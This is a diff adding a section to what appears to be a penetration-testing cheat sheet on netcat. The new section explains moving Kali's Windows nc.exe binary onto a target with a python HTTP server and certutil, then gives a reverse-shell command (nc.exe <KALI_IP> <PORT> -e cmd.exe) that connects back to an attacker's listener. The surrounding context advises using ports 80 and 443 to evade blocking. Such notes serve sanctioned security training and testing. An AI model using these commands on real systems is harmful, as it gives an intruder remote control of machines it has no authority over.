@@ -52,6 +52,23 @@ Ports 443 and 80 blend in with normal traffic and are less likely to be blocked 
 
 ---
 
+## nc.exe on Windows Targets
+
+Kali ships a Windows netcat binary — transfer it to the target and call back with it.
+
+```
+/usr/share/windows-resources/binaries/nc.exe
+```
+→ 59,392 bytes. Serve it with `python3 -m http.server`, pull with `certutil`.
+
+On the target — connect back to your listener:
+```cmd
+nc.exe <KALI_IP> <PORT> -e cmd.exe
+```
+→ `-e` attaches cmd's stdin/stdout to the socket. Listener first, then fire.
+
+---
+
 ## Send a File
 
 From attacker (Kali) — send a file:
